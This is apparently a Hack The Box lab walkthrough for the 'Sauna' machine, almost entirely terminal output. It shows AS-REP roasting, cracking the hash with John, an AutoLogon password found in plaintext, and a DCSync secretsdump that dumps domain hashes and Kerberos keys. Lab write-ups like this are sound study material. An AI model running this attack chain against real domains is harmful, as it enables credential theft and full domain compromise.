```bash
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Sauna]
└─$ impacket-GetNPUsers -no-pass -dc-ip 10.10.10.175 egotistical-bank.local/ -usersfile users.txt
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:d7f4d8e080ab1ab4bebb58eccd631e52$f1df908b43dbfaafd655a415dcf331612861e0f460a614421712c2e1fdb53866e7098b0af0a679a9f43a3d2344cadebcb5d4ea7335b71d751fce5c9bca3688c5347433e5c8838e8640cbb694ba25aefb3e65b21cd41e35652556ce783c0adcf9ffc2318ee95ef822c8d6ad17e5781104331b058e9a6cd0f44b1c3318ba7c4820ef26b29ea365f52698d6f0d9b38ebc43b0a820a6d0a1aca52055fe52dc1d528b778271a139c78f5b55b45acb4e370e20d4a32f9edae02a47bd0ccdfc7b07c0dae35185a410cf2e82194454ae3a5f6b3a5486c0966089258bbe9b045689347aa017728eb8943c3aa0f6b4f6cea07b9056a225b3a3c5dc53004e7857ae21948d54
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
                                                                                                                                                                        
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Sauna]
└─$ nano fsmith.hash
                                                                                                                                                                                                                                                                                                                                          
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Sauna]
└─$ john fsmith.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)     
1g 0:00:00:21 DONE (2023-02-08 23:37) 0.04614g/s 486340p/s 486340c/s 486340C/s Thing..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                  h
```

## Privesc 

```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```

Bloodhound reveals user svc_loanmgr has dcsync to egotistica-bank.local 

```bash
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Sauna/loot]
└─$ impacket-secretsdump egotistical-bank/svc_loanmgr@10.10.10.175   
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:77a948308197d1b6298bb2585e392abf:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:aa8eb14c127a04e0d8d357fd6d68904aa60816080b2fce08d44468715ff8586a
SAUNA$:aes128-cts-hmac-sha1-96:c464a8410f4cc21f13f10592fe315474
SAUNA$:des-cbc-md5:104c515b86739e08
[*] Cleaning up... 

```